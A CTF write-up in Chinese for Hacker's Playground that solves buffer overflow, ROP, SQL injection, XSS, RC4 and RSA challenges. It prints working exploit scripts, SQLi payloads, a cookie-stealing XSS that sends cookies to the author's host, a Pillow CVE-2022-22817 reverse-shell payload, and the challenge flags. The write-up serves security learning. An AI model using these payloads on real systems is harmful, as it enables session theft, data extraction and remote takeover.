# Hacker's Playground

###### tags: `CTF`

## Practice: Flag Submission
![](https://i.imgur.com/zJWWM1r.png)

flag 就在題目中

SCTF{It_15_tim3_t0_hack!!}

## BOF101
![](https://i.imgur.com/mfK19xT.png)

就是經典的 buffer overflow 題目

題目給了兩個檔案: `bof101` `bof101.c`，而 `bof101.c` 內容如下
```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int printflag(){
        char buf[32];
        FILE* fp = fopen("/flag", "r");
        fread(buf, 1, 32, fp);
        fclose(fp);
        printf("%s", buf);
        return 0;
}

int main() {
        int check=0xdeadbeef;
        char name[140];
        printf("printflag()'s addr: %p\n", &printflag);
        printf("What is your name?\n: ");
        scanf("%s", name);
        if (check != 0xdeadbeef){
                printf("[Warning!] BOF detected!\n");
                exit(0);
        }
        return 0;
}
```
目標是要跳到 `printflag` 函式且須保持 check 變數內容不變，一開始會給 `printflag` 的位置之後提示輸入名字，可以看到有明顯的 buffer overflow 漏洞

而 checksec 如下:
```
[*] '/home/ywc/myworkspace/hackers_playground/BOF101/bof101'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

可以看到是使用 x86-64 位元且是 little endian，另外沒有 stack canary 保護，但有 PIE (ASLR)

不過經實測 PIE 部分應該是誤報，實際上位置不會變
![](https://i.imgur.com/2140p0h.png)

根據 x64 layout，需要填入 140 個隨便的東西填滿 buf 空間，並填入 `0xdeadbeef` 到 var2(也就是 check 變數)，接著需要隨便填 8 byte 的RBP，就能控制到 return address
![](https://i.imgur.com/vXyd4tU.png)

payload:
```bash!
echo -e "12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\xef\xbe\xad\xdeAAAAAAAA\x29\x52\x55\x55\x55\x55" | nc bof101.sstf.site 1337
```

![](https://i.imgur.com/rYmUUAg.png)

SCTF{n0w_U_R_B0F_3xpEr7}

## BOF 102
![](https://i.imgur.com/ehMvAnT.png)

題目給了兩個檔案: `bof102` `bof102.c`

bof102.c:
```c=
#include <stdio.h>
#include <stdlib.h>

char name[16];

void bofme() {
        char payload[16];
        puts("What's your name?");
        printf("Name > ");
        scanf("%16s", name);
        printf("Hello, %s.\n", name);
        puts("Do you wanna build a snowman?");
        printf(" > ");
        scanf("%s", payload);
        printf("!!!%s!!!\n", payload);
        puts("Good.");
}

int main() {
        system("echo 'Welcome to BOF 102!'");
        bofme();
        return 0;
}
```

可以看到這一題也有 buffer overflow 的問題，但沒看到有特別的函式

另外，可以看到並沒有啟用 canary 及 PIE，但是有 NX 保護
![](https://i.imgur.com/3F3NNW7.png)

根據題目的 tutorial guide 可以看到這題是要想辦法執行 `/bin/sh` 並拿到 `/flag` 檔案的內容

可以看到，在這題的 main 處有使用到 `system` 函式，所以代表可以跳到 system 的位置並傳入 `/bin/sh` 給它，即可獲得 shell

根據 x86 架構，需要將 stack 蓋成這樣子:
![](https://i.imgur.com/o1sJyoo.png)

AAAA 的部分為 bofme 的 local variables 及 EBP，而 CCCC 的部分為 system 呼叫後的 return address

system() 的位置可透過 objdump 找到
![](https://i.imgur.com/8vFHH5z.png)
位置是在 `0x080483e0`

而由於 system 的參數只有一個且為 char array 的指標，我們需要找一個地方寫入 `/bin/sh` 並填入這個地方的位置

在程式中，可以看到有 `name` 這個 global variable，且我們可以控制
![](https://i.imgur.com/J1xv7gG.png)
其位置是在 `0x0804a034`

完整腳本如下:
```python=
from pwn import *
context.log_level = "debug"
conn = remote("bof102.sstf.site", 1337)
#conn = process("./bof102")

conn.recvuntil("Name >")
conn.sendline("/bin/sh") # global variable (name)

conn.recvuntil(" >")
payload = b"B" * 16 # payload
payload += b"C" * 4 # EBP of bofme
payload += b"\xe0\x83\x04\x08" # system()
payload += b"D" * 4 # RET of system()
payload += b"\x34\xa0\x04\x08" # addr of global variable (name)
conn.sendline(payload)

conn.interactive()
```

![](https://i.imgur.com/WjJZ3uy.png)

SCTF{5t4ck_c4n4ry_4nd_ASLR_4nd_PIE_4re_l3ft_a5_h0m3wOrk}

## BOF 103
![](https://i.imgur.com/oBlYYEE.png)

和前面一樣，題目給了 `bof103` `bof103.c` 這二個檔案

bof103.c 內容如下:
```c=
#include <stdio.h>
#include <stdlib.h>

unsigned long long key;

void useme(unsigned long long a, unsigned long long b)
{
        key = a * b;
}

void bofme() {
        char name[16];

        puts("What's your name?");
        printf("Name > ");
        fflush(stdout);
        scanf("%s", name);
        printf("Bye, %s.\n", name);
}

int main() {
        system("echo 'Welcome to BOF 103!'");
        bofme();
        return 0;
}
```

看起來更上一題很接近，但是這題是 x64 版本，如下

![](https://i.imgur.com/L78CkRA.png)

在防護部分也僅有 NX

在 x86 和 x64 上，對於參數的傳遞有很大的不同。在 x86 中，所有的參數都是丟進 stack 保存，但對於 x64 來說，大部分情況下參數是保存在 register 中，可以增加效能

![](https://i.imgur.com/fFy1y8C.png)

因此在 x64 情況下，需要使用 ROP gadget 來填入數值到暫存器，如下所示

![](https://i.imgur.com/I2ZSvg0.png)

常用的 gadget 像是 `pop rdi; ret;` 或是 `pop rsi; ret;` 這種

可以使用 ROPgadget 工具來找
```bash=
ROPgadget --binary <binary_file>
```

以此題為例，我們需要 call system 並傳入 `/bin/sh` 給它，而在程式中僅有 `key` 這個 global variable，又有另一個函式 `useme` 可以填充這個值，但需要傳入 `a` 和 `b` 變數給它

因此完整的 ROP chain 為:
```
bofme 觸發 buffer overflow
-> 到 rdi gadget 填入 a 值
-> 到 rsi gadget 填入 b 值
-> 到 useme 進行運算寫入 key 變數
-> 到 rdi gadget 填入 key 變數位置
-> 到 system
```

![](https://i.imgur.com/I3aX8Kb.png)

rdi gadget: `0x4007b3`
rsi gadget: `0x400747`
useme address: `0x4006a6`
system address: `0x400550`

![](https://i.imgur.com/iMhyjqo.png)

key address: `0x601068`

程式如下:
```python=
from pwn import *
context.log_level = "debug"
conn = remote("bof103.sstf.site", 1337)
#conn = process("./bof103")
#gdb.attach(conn)

rdi_gadget = p64(0x00000000004007b3)
rsi_gadget = p64(0x0000000000400747)
useme_ptr = p64(0x00000000004006a6)
system_ptr = p64(0x0000000000400550)

conn.recvuntil("Name >")
payload = b"A" * 16 # name
payload += b"B" * 8 # RBP of bofme
payload += rdi_gadget # ROP chain - rdi
payload += b"/bin/sh\x00" # rdi param (a)
payload += rsi_gadget # ROP chain - rsi
payload += p64(1) # rdi param (b)
payload += useme_ptr # useme()
payload += rdi_gadget # ROP chain - rdi
payload += p64(0x601068) # rdi param (&key)
payload += system_ptr # system()
conn.sendline(payload)

conn.interactive()
```

![](https://i.imgur.com/IJXDMGI.png)


SCTF{S0_w3_c4ll_it_ROP_cha1n}

## SQLi 101
![](https://i.imgur.com/YRlyAgJ.png)

進入後，可以看到是一個登入介面
![](https://i.imgur.com/brBgGdS.png)

嘗試使用 `'` 測試是否有 SQL injection
![](https://i.imgur.com/Z1P7gm4.png)

發現可能有，且有給這題的 SQL 提示

嘗試使用 `' or 1=1 -- #` 作為 payload

![](https://i.imgur.com/AdhpJB6.png)

發現不能用 or

經猜測，username 應該是 `admin`，所以可以嘗試以下 payload:

username: `admin' -- #`
password: `<隨便>`

![](https://i.imgur.com/G1DL4PA.png)

SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}

## SQLi 102
![](https://i.imgur.com/OkPl3Nv.png)

另一個 SQL 挑戰

點開連結後，發現是一個類似關鍵字搜尋的功能，且須找到神秘的 table
![](https://i.imgur.com/04ih92w.png)

而右上的 hint 點開後，可以看到確實有 SQL injection 的問題
![](https://i.imgur.com/ltkDZBW.png)

首先先確認 books 有幾個欄位
```!
abac%' union select null,null,null,null,null,null,null,null from books -- #
```
![](https://i.imgur.com/ze0jSUg.png)

測試出來是 8 個

接著測試目前會顯示出來的欄位 id 是那些

```!
abac%' union select 1,2,3,4,5,6,7,8 from books -- #
```

![](https://i.imgur.com/m7eilNj.png)

看起來可以利用 index 2 的 title 欄位來顯示

首先根據 [chetsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-database-with-information_schema)，找出有哪些 database

```!
abac%' union select 1,schema_name,3,4,5,6,7,8 from information_schema.schemata -- #
```

![](https://i.imgur.com/VdRoGeo.png)

看起來東西是在 `sqli102` 中

接著來看其中有哪些 table

```!
abac%' union select 1,table_name,3,4,5,6,7,8 from information_schema.tables where table_schema='sqli102' -- #
```

![](https://i.imgur.com/QeMCdeP.png)

看起來是在 `findme` 中

接著來看這張 table 中有哪些欄位

```!
abac%' union select 1,column_name,3,4,5,6,7,8 from information_schema.columns where table_name='findme' -- #
```

![](https://i.imgur.com/014hsN6.png)

看起來欄位名稱就是 flag 了

SCTF{b451c_SQLi_5k1lls}

## XSS 101
![](https://i.imgur.com/hOAZhUn.png)

很通靈的題目 ==

進入頁面後，可以看到有帳號密碼的輸入
![](https://i.imgur.com/QtDH1c6.png)

先隨便輸入後，發現在登入失敗的情況下有一個 `Need help?` 的連結
![](https://i.imgur.com/6sFr0dA.png)

打開後頁面如下
![](https://i.imgur.com/0UR4LUV.png)

可以推測這是要送 xss payload 的地方

經過一些測試後，仍然找不到觸發 XSS 的地方，看了 tutorial guide 後才發現這邊直接在 description 處輸入 `<script> ... </script>` 即可

payload: `<script>let img = new Image(); img.src="https://mymbs.ywcweb.engineer/?cookie="+document.cookie</script>`

送出後，在主機上確實可以看到有一個 PHPSESSIONID

![](https://i.imgur.com/wAavuYS.png)

後來在 guide 中看到有一個隱藏路徑 `admin.php`，且確實有 session

![](https://i.imgur.com/pD7Oy3V.png)

嘗試將其 session 改成擷取到的 `c4ed1e04efb3f47696ffec68839a4d2c`，發現就會拿到 flag 了

![](https://i.imgur.com/axmwgm7.png)

SCTF{bl1nd_CR055_s1t3_scr1ptin9_att4ck}

## RC four
![](https://i.imgur.com/uHJHKgh.png)

RC4 加密方式:
![](https://i.imgur.com/MhL903A.png)

基本上就是先將 key 做處理產生成新的 key，然後對原訊息做 XOR

題目提供了兩個檔案: `challenge.py` `output.txt`

chellenge.py 內容如下:
```python=
from Crypto.Cipher import ARC4
from secret import key, flag
from binascii import hexlify

#RC4 encrypt function with "key" variable.
def encrypt(data):
        #check the key is long enough
        assert(len(key) > 128)

        #make RC4 instance
        cipher = ARC4.new(key)

        #We don't use the first 1024 bytes from the key stream.
        #Actually this is not important for this challenge. Just ignore.
        cipher.encrypt("0"*1024)

        #encrypt given data, and return it.
        return cipher.encrypt(data)

msg = "RC4 is a Stream Cipher, which is very simple and fast."

print (hexlify(encrypt(msg)).decode())
print (hexlify(encrypt(flag)).decode())
```

可以看到分別將 msg 和 flag 做 RC4 的加密後輸出

output.txt 如下:
```=
634c3323bd82581d9e5bbfaaeb17212eebfc975b29e3f4452eefc08c09063308a35257f1831d9eb80a583b8e28c6e4d2028df5d53df8
624c5345afb3494cdd6394bbbf06043ddacad35d28ceed112bb4c8823e45332beb4160dca862d8a80a45649f7a96e9cb
```

由於 msg 和其加密後的值皆可知，且 msg 和 flag 是使用同一個 key，所以可以先將 msg 和加密過的 msg 做 xor 運算得到處理過的 key，再使用處理過的 key 與加密過的 flag 做運算即可獲得原始的 flag

首先先獲得 RC4 處理過的 key
![](https://i.imgur.com/mXBdCdI.png)

使用這個 key 對加密後的 flag 做 XOR 運算，即可獲得 flag
![](https://i.imgur.com/4km6Bdu.png)

SCTF{B10ck_c1pH3r_4nd_5tr3am_ciPheR_R_5ymm3tr1c}

## RSA 101
![](https://i.imgur.com/VD0ELsC.png)

題目只有給 `challenge.py` 檔案，內容如下:
```python=
from base64 import b64encode, b64decode
from Crypto.Util.number import getStrongPrime, bytes_to_long, long_to_bytes
from os import system

p = getStrongPrime(512)
q = getStrongPrime(512)
n = p * q
e = 65537
d = pow(e, -1, (p - 1) * (q - 1))

print("[RSA parameters]")
print("n =", hex(n))
print("e =", hex(e))

def sign(msg):
        m = bytes_to_long(msg)
        s = pow(m, d, n)
        return long_to_bytes(s)

def verify(s):
        s = bytes_to_long(s)
        v = pow(s, e, n)
        return long_to_bytes(v)

def welcome():
        print("\nWelcome to command signer/executor.")
        print("Menu : 1. Verify and run the signed command")
        print("       2. Generate a signed command")
        print("       3. Base64 encoder")
        print("       4. Exit")

while True:
        welcome()
        sel = input(" > ").strip()
        if sel == "1":
                sgn = input("Signed command: ").strip()
                sgn = b64decode(sgn)
                cmd = verify(sgn)

                commands = ["ls -l", "pwd", "id", "cat flag"]
                if cmd.decode() in commands:
                        system(cmd)
                else:
                        print("Possible commands: ", commands)

        elif sel == "2":
                cmd = input("Base64 encoded command to sign: ")
                cmd = b64decode(cmd)
                if cmd == b"cat flag":
                        print("It's forbidden.")
                else:
                        print("Signed command:", b64encode(sign(cmd)).decode())

        elif sel == "3":
                cmd = input("String to encode: ").strip().encode()
                print("Base64 encoded string:", b64encode(cmd).decode())

        elif sel == "4":
                print("bye.")
                exit()

        else:
                print("Invalid selection.")
```

基本上就是要在選項 1 送入 signed command - `cat flag`，讓它能執行指令

但是在選項 2 Generate signed command中，`cat flag` 不允許，所以需要想辦法繞過，這邊可以利用以下的指數特性

$m^d \equiv (m_1 \times m_2)^d \equiv m_1^d \times m_2^d$

我們可以先算出 `cat flag` 的數值，並想辦法把它拆解成 2 數，接著分別 generate 其的 signed command，並在後面將他們相乘即為原始 `cat flag` 的 signed command 了

首先先算出 `cat flag` 的值
```python=
import Crypto.Util.number as cn
print(cn.bytes_to_long(b"cat flag"))
# 7161132565001953639
```

接著將其分解
```python=
for i in range(2, m//2):
    if(m%i == 0):
        print(i)
        break
# 103

print(m // 103)
# 69525558883514113

print(103 * 69525558883514113 == m)
# True
```

拆解後分別算出 signed command
```python=
import base64
print(base64.b64encode(cn.long_to_bytes(103)))
# b'Zw=='

# Base64 encoded command to sign: Zw==
# Signed command: TdS8ghu2Ghq1LwYBaSBW7RYrZ4TARhITnImd64at2I6M2TQCtFVH42N5Ry58hLWwGyTVzmjqoSP74UTQaum1MgRk7ipKkCru0564lqqmiPC990Uw1X6bxnVnfQ4SNDKm6Ecx8pWv6MWpcLz6rf4RaBN1AQ+IrDA+MtQreGT+zA==

print(base64.b64encode(cn.long_to_bytes(69525558883514113)))
# b'9wEgoA/3AQ=='

# Base64 encoded command to sign: 9wEgoA/3AQ==
# Signed command: K55KeTTZK9I7Fi7mVixnul/798ktKBDMAyjyLt/SJKKCE6owOyKTU/+uiZXT6DxQms9+QFRsFsmJkSwLKuMMKm54hTNEjALkPmoBQsbhbFY3HRytNpCy5DFf5PVU38UxYoqUa4I+NEWZxChe/AgOsKhOXq8PsgKU2BgK/fovvSA=
```

接著，將其處理後相乘，即為 `cat flag` 的 signed command
```python=
c1 = "TdS8ghu2Ghq1LwYBaSBW7RYrZ4TARhITnImd64at2I6M2TQCtFVH42N5Ry58hLWwGyTVzmjqoSP74UTQaum1MgRk7ipKkCru0564lqqmiPC990Uw1X6bxnVnfQ4SNDKm6Ecx8pWv6MWpcLz6rf4RaBN1AQ+IrDA+MtQreGT+zA=="
c2 = "K55KeTTZK9I7Fi7mVixnul/798ktKBDMAyjyLt/SJKKCE6owOyKTU/+uiZXT6DxQms9+QFRsFsmJkSwLKuMMKm54hTNEjALkPmoBQsbhbFY3HRytNpCy5DFf5PVU38UxYoqUa4I+NEWZxChe/AgOsKhOXq8PsgKU2BgK/fovvSA="
n = 0xa79a753946b9734767b39eb5a2ac00e2b0f3b37cad9c75e8b9704c148ce32a1da6d27a75f4903b4420399b160a05560861846e07cad557c9095b8eed152b8ce29adbc13978eae4ac8ac2cb25ec154028e5c878729beec4769aabf098aa1f10dd4610b229320d30e83382c3d26619c236dfd2afd258f6c818d542af839752bef9

c = (cn.bytes_to_long(base64.b64decode(c1)) * cn.bytes_to_long(base64.b64decode(c2))) % n
print(base64.b64encode(cn.long_to_bytes(c)))
# b'OoGWJB3C9dyQf4B5vAnLTkwuM9FFmsuaaiLVbmrPjbAPXdqPfoqN3hGkgvhGu23ZkoleanZcT3Be/VtEQoDLCdJZK3cbcAPo/9n5VtrvGy+6TV/Ipua/MevMCThUJVFOIr7ogaMJN7E6mLLUWd+Hg5g2j+sqIfzeAI+stqrNym4='
```

![](https://i.imgur.com/eKLxMqp.png)

SCTF{Mult1pLic4tiv3_pr0perty_of_RSA}

## RSA 102
![](https://i.imgur.com/ikYOt0e.png)

題目僅給予 `challenge.py` 檔案，內容如下:
```python=
from secret import notice
from Crypto.Util.number import bytes_to_long as b2l

pubkeys = dict()

#Alice's RSA public key
pubkeys['Alice'] = {'n': 0xd244a731d125aa8cbbccc5aa44b70686b432589d7a472269059055119e258e471df27d0f08c3c5e109829381754745f47b6bb3a5e3cc5a3b63766aa8c929290596de12234c244d6746398cc81f774441946c6d0444ce23ab146c33876cf84dc122eb0d42c4437e969ad8b72fbc399c82abd2e153e8d27dff56f517c5cb980853, 'e': 79}

#Bob's RSA public key
pubkeys['Bob'] = {'n': 0xd244a731d125aa8cbbccc5aa44b70686b432589d7a472269059055119e258e471df27d0f08c3c5e109829381754745f47b6bb3a5e3cc5a3b63766aa8c929290596de12234c244d6746398cc81f774441946c6d0444ce23ab146c33876cf84dc122eb0d42c4437e969ad8b72fbc399c82abd2e153e8d27dff56f517c5cb980853, 'e': 61}

def send_notices(addr, msg):
        msg = b2l(msg)
        print(msg)
        for recipient, keypair in addr.items():
                #RSA encryption
                ct = pow(msg, keypair['e'], keypair['n'])
                print("{} <- {}".format(recipient, hex(ct)))

send_notices(pubkeys, notice)

'''
$ python3 challenge.py
Alice <- 0x55edc128e01d6a94d92482d4136a60c5db5e295aec9c38e4029649bfc42eb350cf3ccdddc101c5a81d1251f9b061fe55b436eaba101b0238db479e795661ad64dd0e04898bdd637d33b15c155d1141e70efc84923c126f7d93582d5783544780c9a29818a8f47bad2e47967f7609aa3e6caabbd153c77def6d20e7ed4ac267a8
Bob <- 0xcad43d8d2bcb9ab05133e0923896426544fd8a93e80e0b10efc36019b8a7365390b30530f240b25d3affa6ed03983548fe17f085fe3f04a6bd80aa9093eda484e7c9a120e770000570a2044f7aa6ea5dc25ef082c352205f710b07423160b70f100800d3dedf89843a19208054550f22936fe510e7a98fe1c557b7657abfb77b
'''
```

可以看到 alice 和 bob 使用同一個 n 但是用不同的 e 傳送同一個訊息，可以利用以下公式破密
extendGCD: $r \times x + s \times y = 1$
$(m^r)^x \times (m^s)^y \equiv m^{r \times x + s \times y} \equiv m^1\ (mod\ n)$

且 e1 和 e2 互質，所以可以順利求得 extendGCD

首先先求得 extendGCD
```python=
from gmpy2 import gcdext
_,x,y = gcdext(79, 61)
```

接著使用上面公式，推出原始訊息
```python=
import Crypto.Util.number as cn
pubkeys = dict()
pubkeys['Alice'] = {'n': 0xd244a731d125aa8cbbccc5aa44b70686b432589d7a472269059055119e258e471df27d0f08c3c5e109829381754745f47b6bb3a5e3cc5a3b63766aa8c929290596de12234c244d6746398cc81f774441946c6d0444ce23ab146c33876cf84dc122eb0d42c4437e969ad8b72fbc399c82abd2e153e8d27dff56f517c5cb980853, 'e': 79}
pubkeys['Bob'] = {'n': 0xd244a731d125aa8cbbccc5aa44b70686b432589d7a472269059055119e258e471df27d0f08c3c5e109829381754745f47b6bb3a5e3cc5a3b63766aa8c929290596de12234c244d6746398cc81f774441946c6d0444ce23ab146c33876cf84dc122eb0d42c4437e969ad8b72fbc399c82abd2e153e8d27dff56f517c5cb980853, 'e': 61}

m1 = cn.bytes_to_long(bytes.fromhex("55edc128e01d6a94d92482d4136a60c5db5e295aec9c38e4029649bfc42eb350cf3ccdddc101c5a81d1251f9b061fe55b436eaba101b0238db479e795661ad64dd0e04898bdd637d33b15c155d1141e70efc84923c126f7d93582d5783544780c9a29818a8f47bad2e47967f7609aa3e6caabbd153c77def6d20e7ed4ac267a8"))
m2 = cn.bytes_to_long(bytes.fromhex("cad43d8d2bcb9ab05133e0923896426544fd8a93e80e0b10efc36019b8a7365390b30530f240b25d3affa6ed03983548fe17f085fe3f04a6bd80aa9093eda484e7c9a120e770000570a2044f7aa6ea5dc25ef082c352205f710b07423160b70f100800d3dedf89843a19208054550f22936fe510e7a98fe1c557b7657abfb77b"))

n = pubkeys["Alice"]["n"]
m = (pow(m1,x, n) * pow(m2, y, n)) % n

print(cn.long_to_bytes(m))
# b'SCTF{R4ndOm_p4dd1n9_t0_pr3vEnt_RSA_c0mmOn_m0dulu5_a44ack}'
```

SCTF{R4ndOm_p4dd1n9_t0_pr3vEnt_RSA_c0mmOn_m0dulu5_a44ack}

## Survey

填問卷

![](https://i.imgur.com/SItn9m0.png)

SCTF{7h4nk_yOu_S33_y0u_49a1n_1n_S5TF2O23}

## Imageium
![](https://i.imgur.com/tQNylhb.png)

打開網頁後，可以看到這是一個 image mixer
![](https://i.imgur.com/nFgQiWq.png)

在網頁下方也可以看到他是使用 Pillow 8.2.0 的版本
![](https://i.imgur.com/OnpdUl5.png)

可以看到在送出 mod 的情況下，會傳送封包到這個網址
![](https://i.imgur.com/oDKVhL5.png)

當隨意修改 mod 時，可以看到會有錯誤訊息，並告知是使用 ImageMath 函數處理
http://imageium.sstf.site/dynamic/modified?mode=a
![](https://i.imgur.com/vVfQNUZ.png)

在上網搜尋後，看到這有一個 [CVE-2022-22817](https://github.com/advisories/GHSA-8vj2-vxx3-667w) 的問題，可以直接在裡面填入 python 程式，且此題使用的版本也有這樣的問題
![](https://i.imgur.com/YOdTkDO.png)

在一連串嘗試後，使用 [splitline](https://splitline.tw/) 的 reverse shell 指令來達成 RCE

指令如下:
```python!
import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("mymbs.ywcweb.engineer",2022)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);
```

完整 payload:
```!
mode=exec('import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("mymbs.ywcweb.engineer",2022)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);')
```

在機器上確實可以收到 reverse shell

在觀察後，看到可疑路徑 `./secret/flag.txt`，獲得這題的 flag

![](https://i.imgur.com/a29OGQe.png)

SCTF{3acH_1m@ge_Has_iTs_0wN_MagIC}